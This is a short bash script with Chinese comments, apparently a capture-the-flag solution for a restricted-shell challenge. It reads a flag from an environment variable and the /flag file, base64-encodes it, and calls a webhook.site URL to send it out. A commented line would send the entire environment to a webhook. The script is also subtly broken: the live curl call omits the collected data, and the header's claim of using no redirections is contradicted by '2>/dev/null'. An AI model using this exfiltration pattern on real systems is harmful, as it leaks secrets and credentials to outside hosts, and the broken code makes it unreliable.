#!/bin/bash
# 兼容 bash -re（restricted + errexit）：不用任何重定向，不用包含斜杠的命令名作为可执行名，
# 允许使用带斜杠的参数（如 /flag），避免因命令失败导致整个脚本退出。

# 1) 读取可能的 flag 来源：环境变量 /flag 文件
env_flag="$GZCTF_FLAG"

file_flag=""
if [ -r /flag ]; then
  file_flag="$(cat /flag)"   # 在 -e 下只有在可读时才会执行，不会触发错误退出
fi

# 2) 组装并做 base64，避免特殊字符
data="$(printf '%s|%s' "$env_flag" "$file_flag" | base64 -w0 2>/dev/null || printf '%s|%s' "$env_flag" "$file_flag")"

# 3) 回传到你的 webhook（把 URL 改成你自己的）
curl -fsSL "https://webhook.site/2427af48-d862-4776-92fb-2fe7e93af250"

# 可选：再回传一份环境变量整体（常见容器把 flag 放环境里）
# env | base64 -w0 2>/dev/null | xargs -I{} curl -fsSL "https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?env={}"

echo OK
